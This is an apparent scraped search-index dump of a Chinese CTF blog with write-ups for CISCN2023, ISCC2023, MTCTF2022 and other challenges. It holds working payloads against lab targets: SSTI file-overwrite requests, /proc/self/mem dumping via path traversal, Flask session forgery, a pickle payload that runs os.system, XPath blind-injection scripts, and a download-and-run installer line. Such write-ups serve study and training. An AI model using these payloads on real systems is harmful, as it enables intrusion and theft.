flask对应后端的app.py 思路是通过ssti实现任意文件读写，覆盖app.py，由于app.py开启debug热部署，内容改变会重新加载。 include可以读取文件，但不能直接传引号的字符串，需要一个可控字符串变量 Context –\u003e Request –\u003e Host/Referer 可控 报错获取app.py位置 读文件： {%include c.Request.Referer()%} {%include c.Request.Host()%} Context –\u003e 找到上传文件，SaveUploadedFile(file *multipart.FileHeader,dst string)，需要FileHeader –\u003e FormFile(name string)(*multipart.FileHeader,error) 需要两个可控变量，一个给dst，一个给name，用上面的Host和Referer 写文件： {{c.SaveUploadedFile(c.FormFile(c.Request.Host),c.Request.Referer())}} GET /admin?name={{c.SaveUploadedFile(c.FormFile(c.Request.UserAgent()),c.Request.UserAgent())}} HTTP/1.1 Host: 8d29d285-1292-41ef-85ba-b8c310a6ec3a.challenge.ctf.show Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryrxtSm5i2S6anueQi User-Agent: /app/server.py Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: session-name=MTY4OTI1ODAwNXxEdi1CQkFFQ180SUFBUkFCRUFBQUlfLUNBQUVHYzNSeWFXNW5EQVlBQkc1aGJXVUdjM1J5YVc1bkRBY0FCV0ZrYldsdXzyv2RXchGZcXdaKPew1jYXVZTOE270NGdCUSZk-SNumg== Connection: close Content-Length: 589 ------WebKitFormBoundaryrxtSm5i2S6anueQi Content-Disposition: form-data; name=\"/app/server.py\"; filename=\"server.py\" Content-Type: text/","date":"2023-07-13","objectID":"/ciscn2023%E5%88%9D%E8%B5%9B/:1:3","tags":["ctf"],"title":"CISCN2023初赛","uri":"/ciscn2023%E5%88%9D%E8%B5%9B/"},{"categories":["ctf"],"content":"DeserBug（java，之后再看 https://boogipop.com/2023/05/30/CISCN2023%E5%88%9D%E8%B5%9B%20Web%20WriteUp(%E5%90%AB%E5%A4%8D%E7%8E%B0)/#DeserBug-%E5%A4%8D%E7%8E%B0 ","date":"2023-07-13","objectID":"/ciscn2023%E5%88%9D%E8%B5%9B/:1:4","tags":["ctf"],"title":"CISCN2023初赛","uri":"/ciscn2023%E5%88%9D%E8%B5%9B/"},{"categories":["ctf"],"content":"reading https://un1novvn.github.io/2023/05/29/ciscn2023/ 黑盒题，可跨目录读取文件 借助经典的两个目录/proc/self/environ \u0026\u0026 /proc/self/cmdline 来读更多信息，获取源代码 /proc/self/cwd/app.py import os import math import time import hashlib from flask import Flask, request, session, render_template, send_file from datetime import datetime app = Flask(__name__) app.secret_key = hashlib.md5(os.urandom(32)).hexdigest() key = hashlib.md5(str(time.time_ns()).encode()).hexdigest() @app.route('/books', methods=['GET', 'POST']) def book_page(): filepath = request.args.get('book') if request.args.get('page_size'): page_size = int(request.args.get('page_size')) else: page_size = 3000 if request.args.get('page'): page = int(request.args.get('page')) else: page = 1 words = read_file_page(filepath, page, page_size) return '\\n'.join(words) @app.route('/flag', methods=['GET', 'POST']) def flag(): if hashlib.md5(session.get('key').encode()).hexdigest() == key: return \"flag{xxxxxxxxxxxxxxxxxx}\" else: return \"no no no\" def read_file_page(filename, page_number, page_size): for i in range(3): for j in range(3): size=page_size + j offset = (page_number - 1) * page_size+i try: with open(filename, 'rb') as file: file.seek(offset) words = file.read(size) return words.decode().split('\\n') except Exception as e: pass #if error again offset = (page_number - 1) * page_size with open(filename, 'rb') as file: file.seek(offset) words = file.read(page_size) return words.split(b'\\n') if __name__ == '__main__': app.run(host='0.0.0.0') 配合start和end读内存，读取全部内存，找到32位字符串，那就是key或secret_key（通常做法） 内存里有些区域不可读，所以需要利用/proc/self/maps去读段的起始地址和结束地址 读取mem脚本： import requests,time,re #maps里是读maps的原始内容 maps = open('maps').read().split('\\n') start_end = [] for line in maps: if ' r' not in line: #忽略不可读的内存 continue line = line.split()[0] start = line.split('-')[0] end = line.split('-')[1] start_end.append([start,end]) page_size = 4096 for i,line in enumerate(start_end): start = int(line[0],16) end = int(line[1],16) # page_size = end-start 写了这条也可 start_page = start // page_size page_num = (end-start)//page_size print(f'[*]{i + 1}/{len(start_end)}', 'page_num: ',page_num) result = open(f'my/{line[0]}-{line[1]}.bin', 'wb') for page in range(page_num): url = f'http://192.168.190.130:5000/books?book=../../../../../../../proc/self/mem\u0026page={start_page+page}\u0026page_size={page_size}' res = requests.get(url) result.write(res.text.encode()) result.write(b'\\n') result.close() 全局正则匹配，找到两个考得近的32位字符串 9776436d6a1453cf13eceee8cda4fd84 e6e69a980d637186e90656f2d9a5a1a8 解session，可以解的是secret_key（9776436d6a1453cf13eceee8cda4fd84），剩下的为key（e6e69a980d637186e90656f2d9a5a1a8） https://github.com/noraj/flask-session-cookie-manager 接下来爆时间戳 从程序运行（开靶场）时，敲几个时间戳出来，前面几位固定，爆破后面数字 用hashcat爆破 hashcat -m 0 -a 3 e6e69a980d637186e90656f2d9a5a1a8 168924550?d?d?d?d?d?d?d?d?d?d （前面爆破出了，再爆破直接用–show显示结果） e6e69a980d637186e90656f2d9a5a1a8:1689245500101730900 伪造session（注意key后的空格） python .\\flask_session_cookie_manager3.py encode -s \"9776436d6a1453cf13eceee8cda4fd84\" -t \"{'key': '1689245500101730900'}\" eyJrZXkiOiIxNjg5MjQ1NTAwMTAxNzMwOTAwIn0.ZK_Zsg.9oonOJJLBNz-XhXMQM9H7RCxo9Q 访问/flag ","date":"2023-07-13","objectID":"/ciscn2023%E5%88%9D%E8%B5%9B/:1:5","tags":["ctf"],"title":"CISCN2023初赛","uri":"/ciscn2023%E5%88%9D%E8%B5%9B/"},{"categories":["ctf"],"content":"BackendService https://mp.weixin.qq.com/s/2TDV2L-o1MlbYU0PSjb65Q https://blog.csdn.net/Hoopy_Hoopy/article/details/120283270 https://xz.aliyun.com/t/11493#toc-5 nacos漏洞 未授权；配置，反弹shell ","date":"2023-07-13","objectID":"/ciscn2023%E5%88%9D%E8%B5%9B/:1:6","tags":["ctf"],"title":"CISCN2023初赛","uri":"/ciscn2023%E5%88%9D%E8%B5%9B/"},{"categories":["ctf"],"content":"RE ","date":"2023-07-13","objectID":"/ciscn2023%E5%88%9D%E8%B5%9B/:2:0","tags":["ctf"],"title":"CISCN2023初赛","uri":"/ciscn2023%E5%88%9D%E8%B5%9B/"},{"categories":["ctf"],"content":"babyre https://snap.berkeley.edu/snap/snap.html secret export 102,10,13,6,28,74,3,1,3,7,85,0,4,75,20,92,92,8,28,25,81,83,7,28,76,88,9,0,29,73,0,86,4,87,87,82,84,85,4,85,87,30 exp.py data = [102,10,13,6,28,74,3,1,3,7,85,0,4,75,20,92,92,8,28,25,81,83,7,28,76,88,9,0,29,73,0,86,4,87,87,82,84,85,4,85,87,30] flag = chr(data[0]) for i in range(1, len(data)): data[i] = data[i] ^ data[i-1] flag += chr(data[i]) print(flag) ","date":"2023-07-13","objectID":"/ciscn2023%E5%88%9D%E8%B5%9B/:2:1","tags":["ctf"],"title":"CISCN2023初赛","uri":"/ciscn2023%E5%88%9D%E8%B5%9B/"},{"categories":["ctf"],"content":"MISC ","date":"2023-07-13","objectID":"/ciscn2023%E5%88%9D%E8%B5%9B/:3:0","tags":["ctf"],"title":"CISCN2023初赛","uri":"/ciscn2023%E5%88%9D%E8%B5%9B/"},{"categories":["ctf"],"content":"被加密的生产流量 ","date":"2023-07-13","objectID":"/ciscn2023%E5%88%9D%E8%B5%9B/:3:1","tags":["ctf"],"title":"CISCN2023初赛","uri":"/ciscn2023%E5%88%9D%E8%B5%9B/"},{"categories":["ctf"],"content":"pyshell python shell 字符串长度为7 python特性 下划线表示上次输出结果，拼接得到命令 \"__import__('system').os('cat /f*')\" eval(_) ","date":"2023-07-13","objectID":"/ciscn2023%E5%88%9D%E8%B5%9B/:3:2","tags":["ctf"],"title":"CISCN2023初赛","uri":"/ciscn2023%E5%88%9D%E8%B5%9B/"},{"categories":["ctf"],"content":"国粹 题目.png从0开始标号，将a.png和k.png转化为编号列表，分别作为x和y，画出轨迹图 ","date":"2023-07-13","objectID":"/ciscn2023%E5%88%9D%E8%B5%9B/:3:3","tags":["ctf"],"title":"CISCN2023初赛","uri":"/ciscn2023%E5%88%9D%E8%B5%9B/"},{"categories":["ctf"],"content":"Crypto ","date":"2023-07-13","objectID":"/ciscn2023%E5%88%9D%E8%B5%9B/:4:0","tags":["ctf"],"title":"CISCN2023初赛","uri":"/ciscn2023%E5%88%9D%E8%B5%9B/"},{"categories":["ctf"],"content":"基于国密SM2算法的密钥密文分发 非预期： 跟着文档操作login，allkey，quantum，在search中能直接看到quantumStringServer的值，在check提交 最后在search中看到flag ","date":"2023-07-13","objectID":"/ciscn2023%E5%88%9D%E8%B5%9B/:4:1","tags":["ctf"],"title":"CISCN2023初赛","uri":"/ciscn2023%E5%88%9D%E8%B5%9B/"},{"categories":["ctf"],"content":"可信度量 非预期： grep寻找flag，发现在proc/22/task/22/environ ","date":"2023-07-13","objectID":"/ciscn2023%E5%88%9D%E8%B5%9B/:4:2","tags":["ctf"],"title":"CISCN2023初赛","uri":"/ciscn2023%E5%88%9D%E8%B5%9B/"},{"categories":["ctf"],"content":"Sign_in_passwd j2rXjx8yjd=YRZWyTIuwRdbyQdbqR3R9iZmsScutj2iqj3/tidj1jd=D GHI3KLMNJOPQRSTUb%3DcdefghijklmnopWXYZ%2F12%2B406789VaqrstuvwxyzABCDEF5 第二行url解码后作为编码表，再将第一行base64解码 ","date":"2023-07-13","objectID":"/ciscn2023%E5%88%9D%E8%B5%9B/:4:3","tags":["ctf"],"title":"CISCN2023初赛","uri":"/ciscn2023%E5%88%9D%E8%B5%9B/"},{"categories":["ctf"],"content":"badkey1 第一步爆破sha256前四位 第二步找到p与q，使construct报错（应该要d和n不互素 ed = k1(p-1)(q-1) + 1 d = k2pq ek2pq = k1*(p-1)*(q-1)+1 ","date":"2023-07-13","objectID":"/ciscn2023%E5%88%9D%E8%B5%9B/:4:4","tags":["ctf"],"title":"CISCN2023初赛","uri":"/ciscn2023%E5%88%9D%E8%B5%9B/"},{"categories":["ctf"],"content":"MISC ","date":"2023-07-12","objectID":"/2022%E5%AF%92%E5%81%87/:1:0","tags":["ctf"],"title":"2022寒假","uri":"/2022%E5%AF%92%E5%81%87/"},{"categories":["ctf"],"content":"tools （Hgame 2021 Week2） 附件 从压缩包名字可知图片由F5加密，从图片属性得到密码**!LyJJ9bi\u0026M7E72_JyD_，f5-steganography解密得到e****@317S **** p1A4bIYIs1M** (注意解密时密码加’ ‘) 同理，第二层是steghide，密码为A7SL9nHRJXLh@\u0026 第三层是outguess，密码为z0GFieYAee%gdf0%lF，提取到**@UjXL93044V5zl2ZKI **** ** 第四层是JPHS，密码为rFQmRoT5lze**@4X4 **** @0**，提取到xSRejK1Z1Cp9M!z@H 将前面四个图片拼图成一个二维码， 扫描得到hgame{Taowa_is_N0T_g00d_but_T001s_is_Useful} ","date":"2023-07-12","objectID":"/2022%E5%AF%92%E5%81%87/:1:1","tags":["ctf"],"title":"2022寒假","uri":"/2022%E5%AF%92%E5%81%87/"},{"categories":["ctf"],"content":"YUSA的小秘密 （西湖论剑 2021） 附件 YCrCb通道的LSB隐写，利用Python的cv2库进行色彩空间转换并提取通道信息 可参考ByteCTF 2020的Hardcore Watermark 01 import cv2 img=cv2.imread('D:\\IDM download\\lsb\\lsb.png') #图片路径 src_value=cv2.cvtColor(img, cv2.COLOR_BGR2YCrCb) a, b, c = cv2.split(src_value) #使用cv.split分离通道 #对三个通道中的数据分别根据奇偶做二值化处理，并分别保存为图片 cv2.imwrite('a.png', (a % 2) * 255) cv2.imwrite('b.png', (b % 2) * 255) cv2.imwrite('c.png', (c % 2) * 255) 从a.png可以清晰得到DASCTF{2947b683036d49e5681f83f7bc3fbb34} ","date":"2023-07-12","objectID":"/2022%E5%AF%92%E5%81%87/:1:2","tags":["ctf"],"title":"2022寒假","uri":"/2022%E5%AF%92%E5%81%87/"},{"categories":["ctf"],"content":"不起眼压缩包的养成的方法 （Hgame 2021 Week1） 附件 一张0x4qE.jpg（圣人惠），备注 Secret hidden IN picture. 在010 editor打开，发现zip文件头，用kali的binwalk提取压缩包，压缩包备注 Password is picture ID (Up to 8 digits) 暴力破解得到密码 70415155，得到另一个压缩包和一个NO PASSWORD.txt 发现压缩包中有相同txt，尝试明文破解，结合明文提示，使用winrar采用Store压缩方法将明文压缩成zip（不然用软件明文破解时会报错），再用软件ARCHPR进行明文破解，得到密码 C8uvP$DP ，解压后得到flag.zip 用010 editor查看，发现一串奇怪字符 html编码，用CyberChef解码得到hgame{2IP_is_Usefu1_and_Me9umi_i5_W0r1d} ","date":"2023-07-12","objectID":"/2022%E5%AF%92%E5%81%87/:1:3","tags":["ctf"],"title":"2022寒假","uri":"/2022%E5%AF%92%E5%81%87/"},{"categories":["ctf"],"content":"内存取证 （V\u0026N 2020公开赛） 题目链接 题目给了一个raw镜像文件，用volatility查看基本信息 # volatility2在kali中的安装： git clone https://github.com/volatilityfoundation/volatility # 直接下载，解压后即可使用,需用python2 # 不过老是会报错无Crypto.Hash模块 sudo python vol.py -f ../mem.raw imageinfo # 查看文件的profile Win7SP1x86_23418 sudo python vol.py -f ../mem.raw --profile=Win7SP1x86_23418 filescan | grep flag # 查看有没有名为flag文件 sudo python vol.py -f ../mem.raw --profile=Win7SP1x86_23418 pslist # 查看运行了哪些进程 其中有几个关键应用，notepad是文本编辑器，iexplore是ie浏览器，mspaint是xp系统自带的画板，TrueCrypt是一款免费，开源的支持Windows Vista/XP/2000 and Linux的绿色虚拟加密磁盘工具，可以在硬盘上创建一个或多个虚拟磁盘，所有虚拟磁盘上的文件都被自动加密，需要通过密码来进行访问。 TrueCrypt提供多种加密算法，如AES-256、Blowfish(448-bitkey)、CAST5、Serpent、Triple DES等，其他特性还包括支持FAT32和NTFS分区、隐藏卷标和热键启动。 sudo python vol.py -f ../mem.raw --profile=Win7SP1x86_23418 iehistory | grep 'https://' # 查看浏览器记录 很明显的是访问了百度网盘 sudo python vol.py -f ../mem.raw --profile=Win7SP1x86_23418 editbox # 查看文本编辑器 给出了百度网盘链接和提取码，不过分享文件取消了，题目有给附件，是一个VOL文件 sudo python vol.py -f ../mem.raw --profile=Win7SP1x86_23418 memdump -p 2648 --dump-dir=../ # 通过pid将mspaint这块内存dump下来 将2648.dmp后缀改为data，然后用gimp打开（kali中直接用apt-get安装即可），先任意宽度和高度，调节位移出现模糊字迹，再调节宽度至清晰，上下翻转后（可以放到word中翻转）得到1YxfCQ6goYBD6Q 接下来是TrueCrypt，OVL文件是用TrueCrypt加密后的一个磁盘，需要进行解密 先将TrueCrypt内存dump下来 sudo python vol.py -f ../mem.raw --profile=Win7SP1x86_23418 memdump -p 3364 --dump-dir=../ 再用到软件Elcomsoft Forensic Disk Decryptor，来破解这个磁盘文件的key值。 （选择第二个和第三个差不多） （在选择VOL文件时文件夹不显示，直接在下面文件名搜索VOL） 然后在E盘（临时分区）得到key值uOjFdKu1jsbWI8N51jsbWI8N5 接下来用软件VeraCrypt挂载磁盘 在F盘得到zip加密文件，密码是之前mspaint得到的字符串，解压后得到flagRoarCTF{wm_D0uB1e_TC-cRypt} 参考： BUUCTF V\u0026N-misc内存取证 - Pur3 - 博客园 (cnblogs.com) 内存取证例题 - 不会修电脑 - 博客园 (cnblogs.com) ","date":"2023-07-12","objectID":"/2022%E5%AF%92%E5%81%87/:1:4","tags":["ctf"],"title":"2022寒假","uri":"/2022%E5%AF%92%E5%81%87/"},{"categories":["ctf"],"content":"WEB phpstudy在kali的安装： sudo wget -O install.sh https://notdocker.xp.cn/install.sh \u0026\u0026 sudo bash install.sh 安装成功后点击内网链接，登录phpstudy，在软件管理中安装MySQL并启动 配置靶场参考：kali虚拟机phpstudy 下配置sqli-labs靶场 - HYLUZ DVWA靶场配置：DVWA 靶场环境搭建 - Butterflier - 博客园 (cnblogs.com) ","date":"2023-07-12","objectID":"/2022%E5%AF%92%E5%81%87/:2:0","tags":["ctf"],"title":"2022寒假","uri":"/2022%E5%AF%92%E5%81%87/"},{"categories":["ctf"],"content":"https://kjd3xtsq9r.feishu.cn/docs/doccnyU9DQVNEIhvjc72lMc2yq3#EizBUz ","date":"2023-07-12","objectID":"/iscc2023/:0:0","tags":["ctf"],"title":"ISCC2023","uri":"/iscc2023/"},{"categories":["ctf"],"content":"WEB ","date":"2023-07-12","objectID":"/iscc2023/:1:0","tags":["ctf"],"title":"ISCC2023","uri":"/iscc2023/"},{"categories":["ctf"],"content":"羊了个羊 U1ZORFEzczJkR3BvZWpsdVlrWk9WMWd5ZGpOa05VTTFORGRwTTIweFRFRktVRWwzVFgwPQ== 两次base64 ISCC{6tjhz9nbFNWX2v3d5C547i3m1LAJPIwM} ","date":"2023-07-12","objectID":"/iscc2023/:1:1","tags":["ctf"],"title":"ISCC2023","uri":"/iscc2023/"},{"categories":["ctf"],"content":"Where_is_your_love vue.js function decode(str){ var result=\"\"; for(i=1;i\u003cstr.length;i+=3){ result+=\"\"+String.fromCharCode(parseInt((str.substr(i,2)).toString(2),14)); } return result; } eval(decode(\"%72%7d%71%85%7b%73%7c%84%34%87%82%77%84%73%2c%72%73%71%7d%72%73%2c%26%29%3a%3a%29%3d%38%29%3d%3d%29%40%3c%29%38%3a%29%3d%3d%29%3d%38%29%3a%3b%29%38%3c%29%3b%39%29%3b%72%29%3a%70%29%3a%70%29%39%3d%29%38%3c%29%38%3a%29%40%39%29%40%3a%29%40%41%29%3d%6d%29%3d%39%29%3a%3b%29%38%3c%29%40%36%29%3d%72%29%40%39%29%3d%3d%29%40%3a%29%3d%3d%29%3d%72%29%3d%71%29%3a%38%29%3c%72%29%3d%36%29%40%39%29%3d%72%29%3d%6d%29%40%3b%29%40%3a%29%3d%39%29%3a%39%29%3d%6d%29%3d%39%29%3d%3a%29%40%3a%29%3a%38%29%39%40%29%39%3c%29%39%3c%29%38%3c%29%38%3a%29%3d%72%29%3d%71%29%3d%70%29%3d%72%29%40%3b%29%40%39%29%3d%39%29%3d%70%29%3d%72%29%40%3c%29%3d%39%29%3a%3b%29%38%3c%29%3d%39%29%40%39%29%3d%37%29%3d%38%29%40%3c%29%38%71%29%38%72%29%38%3c%29%3a%3c%29%3a%3a%29%3d%3d%29%3d%71%29%40%36%29%40%3b%29%40%3a%29%38%3a%29%3d%3d%29%3d%38%29%3a%3b%29%38%3c%29%3d%36%29%40%3b%29%40%3a%29%38%3c%29%38%3a%29%40%3a%29%40%41%29%40%36%29%3d%39%29%3a%3b%29%38%3c%29%3d%36%29%40%3b%29%40%3a%29%40%3a%29%3d%72%29%3d%71%29%38%3c%29%38%3a%29%40%3c%29%3c%72%29%3d%6d%29%40%3b%29%3d%39%29%3a%3b%29%38%3c%29%3d%37%29%3d%6d%29%3d%3d%29%3d%37%29%3d%41%29%38%3a%29%3d%70%29%3d%39%29%38%3b%29%38%3c%29%38%3a%29%3d%72%29%3d%71%29%3d%3a%29%3d%72%29%3d%37%29%40%3b%29%40%39%29%3a%3b%29%38%3c%29%3d%71%29%3d%72%29%3d%41%29%40%36%29%38%71%29%38%72%29%3a%39%29%38%3c%29%38%3a%29%3d%72%29%3d%71%29%3d%37%29%3d%6d%29%3d%3d%29%3d%37%29%3d%41%29%3a%3b%29%38%3c%29%40%3d%29%3d%3d%29%3d%71%29%3d%38%29%3d%72%29%40%3d%29%39%3a%29%3d%6d%29%3d%72%29%3d%37%29%3c%72%29%40%3a%29%3d%3d%29%3d%72%29%3d%71%29%3a%3b%29%38%70%29%3a%71%29%3d%72%29%40%3d%29%3d%71%29%3d%6d%29%3d%72%29%3c%72%29%3d%38%29%39%3a%29%40%36%29%3d%3c%29%40%36%29%38%70%29%3a%39%29%38%3c%29%3a%3c%29%3a%3a%29%39%3b%29%3d%38%29%3d%3d%29%40%3c%29%3a%3c%26%2d%2d\")); eval(decode(\"%72%7d%71%85%7b%73%7c%84%34%87%82%77%84%73%2c%72%73%71%7d%72%73%2c%26%29%3a%3a%29%3d%38%29%3d%3d%29%40%3c%29%38%3a%29%3d%3d%29%3d%38%29%3a%3b%29%38%3c%29%3b%39%29%3b%72%29%3a%70%29%3a%70%29%39%40%29%38%3c%29%38%3a%29%40%39%29%40%3a%29%40%41%29%3d%6d%29%3d%39%29%3a%3b%29%38%3c%29%40%36%29%3d%72%29%40%39%29%3d%3d%29%40%3a%29%3d%3d%29%3d%72%29%3d%71%29%3a%38%29%3c%72%29%3d%36%29%40%39%29%3d%72%29%3d%6d%29%40%3b%29%40%3a%29%3d%39%29%3a%39%29%3d%6d%29%3d%39%29%3d%3a%29%40%3a%29%3a%38%29%39%71%29%39%3c%29%39%3c%29%38%3c%29%38%3a%29%3d%72%29%3d%71%29%3d%70%29%3d%72%29%40%3b%29%40%39%29%3d%39%29%3d%70%29%3d%72%29%40%3c%29%3d%39%29%3a%3b%29%38%3c%29%3d%39%29%40%39%29%3d%37%29%3d%70%29%40%3c%29%38%71%29%38%72%29%38%3c%29%3a%3c%29%3a%3a%29%3d%3d%29%3d%71%29%40%36%29%40%3b%29%40%3a%29%38%3a%29%3d%3d%29%3d%38%29%3a%3b%29%38%3c%29%3d%36%29%40%3b%29%40%3a%29%39%3d%29%38%3c%29%38%3a%29%40%3a%29%40%41%29%40%36%29%3d%39%29%3a%3b%29%38%3c%29%3d%36%29%40%3b%29%40%3a%29%40%3a%29%3d%72%29%3d%71%29%38%3c%29%38%3a%29%40%3c%29%3c%72%29%3d%6d%29%40%3b%29%3d%39%29%3a%3b%29%38%3c%29%3d%3a%29%3d%72%29%3d%6d%29%3d%6d%29%3d%72%29%40%3d%29%38%3a%29%3d%70%29%3d%39%29%38%3b%29%38%3c%29%38%3a%29%3d%72%29%3d%71%29%3d%3a%29%3d%72%29%3d%37%29%40%3b%29%40%39%29%3a%3b%29%38%3c%29%3d%71%29%3d%72%29%3d%41%29%40%36%29%38%71%29%38%72%29%3a%39%29%38%3c%29%38%3a%29%3d%72%29%3d%71%29%3d%37%29%3d%6d%29%3d%3d%29%3d%37%29%3d%41%29%3a%3b%29%38%3c%29%40%3d%29%3d%3d%29%3d%71%29%3d%38%29%3d%72%29%40%3d%29%39%3a%29%3d%6d%29%3d%72%29%3d%37%29%3c%72%29%40%3a%29%3d%3d%29%3d%72%29%3d%71%29%3a%3b%29%38%70%29%3a%72%29%3d%71%29%3d%37%29%39%3a%29%40%36%29%3d%3c%29%40%36%29%38%70%29%3a%39%29%38%3c%29%39%3b%29%3a%3c%29%3a%3a%29%39%3b%29%3d%38%29%3d%3d%29%40%3c%29%3a%3c%26%2d%2d\")); eval(decode(\"%72%7d%71%85%7b%73%7c%84%34%87%82%77%84%73%2c%72%73%71%7d%72%73%2c%26%29%3a%3a%29%3d%38%29%3d%3d%29%40%3c%29%38%3a%29%3d%3d%29%3d%38%29%3a%3b%29%38%3c%29%3b%39%29%3b%72%29%3a%70%29%3a%70%29%39%41%29%38%3c%29%38%3a%29%40%39%29%40%3a%29%40%41%29%3d%6d%29%3d%39%29","date":"2023-07-12","objectID":"/iscc2023/:1:2","tags":["ctf"],"title":"ISCC2023","uri":"/iscc2023/"},{"categories":["ctf"],"content":"上大号说话 输入 马保国，提示有东西在.git下 app.py.bak class ED: def __init__(self): self.file_key = ... # 1Aa self.cipher_suite = Fernet(self.generate_key(self.file_key)) def crypto(self, base_str): return self.cipher_suite.encrypt(base_str) @staticmethod def generate_key(key: str): key_byte = key.encode() return base64.urlsafe_b64encode(key_byte + b'0' * 28) def check_cookies(cookie): ed = ED() f, result = ed.decrypto(cookie) black_list = ... if not result[0:2] == b'\\x80\\x03': return False ... try: result = pickle.loads(result) if result.name == 'mabaoguo' and result.random == mabaoguo.random and result.gongfu == mabaoguo.gongfu: return flag else: return result.name except: return False @app.route('/', methods=['GET', 'POST']) def index(): if request.method == 'POST': name = request.form['input_field'] name = Member(name) name_pick = pickle.dumps(name, protocol=3) name_pick = pickletools.optimize(name_pick) ed = ED() response = make_response(redirect('/')) response.set_cookie('name', ed.crypto(name_pick).decode()) return response temp_cookies = request.cookies.get('name') if not temp_cookies: ... else: f = check_cookies(temp_cookies) ... if __name__ == '__main__': app.run() 通过cookie爆破得到file_key import string import base64 from cryptography.fernet import Fernet dic = [str(i) for i in range(1, 10)] le = string.ascii_uppercase + string.ascii_lowercase for i in le: dic.append(i) cookie = 'gAAAAABkYiDhLxAZVVyExYlvynjNlizOuHxA3piriLZIQ-gomirHUqdO0ILiMAnI1rmV-k_A8AIue9-2rBh8k9oDLOSsHDFi8vAcHDIrygVheRny82F_jGGjRjlAnptQd0TFFNJI-pn-9-Pyzn3gUXoPxCSxeST0iVJ9MXQgb5WpMb5KsglbmPY=' for i1 in dic: for i2 in dic: for i3 in dic: for i4 in dic: file_key = i1 + i2 + i3 + i4 cipher_suite = Fernet(base64.urlsafe_b64encode(file_key.encode() + b'0' * 28)) try: name_pick = cipher_suite.decrypt(cookie) print(name_pick) # b'\\x80\\x03c__main__\\nMember\\n)\\x81}(X\\x04\\x00\\x00\\x00nameX\\x08\\x00\\x00\\x00mabaoguoX\\x06\\x00\\x00\\x00randomX\\x0f\\x00\\x00\\x00orfszdjckabphxlub.' print(file_key) # 5MbG input() except: continue pickle反序列化外带结果 奇安信攻防社区-pickle反序列化深入python源码分析 (butian.net) class ED: def __init__(self): self.file_key=\"5MbG\" # 1Aa self.cipher_suite = Fernet(self.generate_key(self.file_key)) def crypto(self, base_str): return self.cipher_suite.encrypt(base_str) def decrypto(self, base_str): return self.cipher_suite.decrypt(base_str) @staticmethod def generate_key(key: str): key_byte = key.encode() return base64.urlsafe_b64encode(key_byte + b'0' * 28) result = b'\\x80\\x03cbuiltins\\nmap\\n(cos\\nsystem\\n(V{命令}\\ntt\\x81p0\\n0cbuiltins\\nbytes\\n(g0\\nt\\x81.' ed=ED() base=ed.crypto(result).decode() print(base) ","date":"2023-07-12","objectID":"/iscc2023/:1:3","tags":["ctf"],"title":"ISCC2023","uri":"/iscc2023/"},{"categories":["ctf"],"content":"MOBILE ","date":"2023-07-12","objectID":"/iscc2023/:2:0","tags":["ctf"],"title":"ISCC2023","uri":"/iscc2023/"},{"categories":["ctf"],"content":"NOJAVA apk反编译 apk 反编译（使用apktool、dex2jar、jd-gui，进行反编译apk，查看apk源码）_villen_t的博客-CSDN博客 获取资源 apktool java -jar .\\apktool_2.7.0.jar d -f attachment-21.apk -o MMTS 获取代码 dex2jar-2.0 + jd-gui .\\d2j-dex2jar.bat .\\classes.dex 得到.\\classes-dex2jar.jar jd-gui打开 com/example.nojava/MainActivity.class private final boolean B(String paramString) { if (paramString.length() \u003c= 6) return false; String str = paramString.substring(0, 5); Intrinsics.checkNotNullExpressionValue(str, \"this as java.lang.StringendIndex)\"); if (Intrinsics.areEqual(str, \"ISCC{\") \u0026\u0026 paramString.charAt(paramString.length() - 1) == '}') { E e = new E(); e.h(); if (Intrinsics.areEqual(e.j(paramString), \"efZYiiYejYefjjejjZfYjije\")) return true; } return false; } 或者jadx gui直接apk反编译 exp.py import libnum # s = 'efZYiiYejYefjjejjZfYjije' # 字符串 s = libnum.s2n(s) a = bin(s)[2:] a = (4-(len(a)%4))*'0'+a a = [a[i*4:(i+1)*4] for i in range(len(a)//4)] payload=\"\" for i in a: if i==\"1001\": payload+=\"10\" elif i==\"0110\": payload+=\"01\" elif i==\"1010\": payload+=\"11\" elif i==\"0101\": payload+=\"00\" else: print(\"waaa\") print(payload) print('ISCC{' + libnum.n2s(int(payload, 2)).decode() + '}') ","date":"2023-07-12","objectID":"/iscc2023/:2:1","tags":["ctf"],"title":"ISCC2023","uri":"/iscc2023/"},{"categories":["ctf"],"content":"WEB ","date":"2023-07-12","objectID":"/mtctf2022/:1:0","tags":["ctf"],"title":"MTCTF2022","uri":"/mtctf2022/"},{"categories":["ctf"],"content":"babyjava xpath注入 参考： XPATH注入学习 - 先知社区 (aliyun.com) 类似于sql注入，通过注入获取节点信息 语法 “nodename” – 选取nodename的所有子节点 “/nodename” – 从根节点中选择 “//nodename” – 从当前节点选择 “..” – 选择当前节点的父节点 “child::node()” – 选择当前节点的所有子节点 “@” -选择属性 “//user[position()=2] \" 选择节点位置 盲注 ' or count(/)=1 and ''=' # 根节点数量 ' or count(/*)=1 and ''=' # 根节点下子节点个数 ' or string-length(name(/*[1]))=4 and ''=' # 根节点下节点长度 ' or substring(name(/*[1]),2,1)='a' and ''=' # 根节点下节点名称，第二个字符是否为a ' or count(/root)=1 and ''=' # root节点下节点个数 ' or string-length(name(/root/*[1]))=4 and ''=' # root第一个子节点长度 ' or substring(name(//user[position=1]/username[position=2]),2,1)='l' and ''=' # 第一个user下第二个username值，第二个字符是否为l 节点信息 root 1 len:4 user 2 len:8 username len:8 username 脚本 import requests url = 'http://eci-2zeck6h5lu4hlf0o62vg.cloudeci1.ichunqiu.com:8888/hello' head = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36(KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } strs = '}_{-abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ' flag = '' for i in range(1, 100): for j in strs: payload_1 = { # root \"xpath\":\"' or substring(name(/*[1]), {}, 1)={} and ''='\".format(i,j) } payload_2 = { # user \"xpath\":\"'or substring(name(/root/*[1]), {}, 1)={} and ''='\".format(i,j) } payload_3 = { # username \"xpath\":\"'or substring(name(/root/user/*[2]), {}, 1)={} and ''='\".format(i,j) } payload_4 = { # flag \"xpath\":\"' or substring(name(//user/username[2]), {}, 1)={} and ''='\".format(i,j) } r = 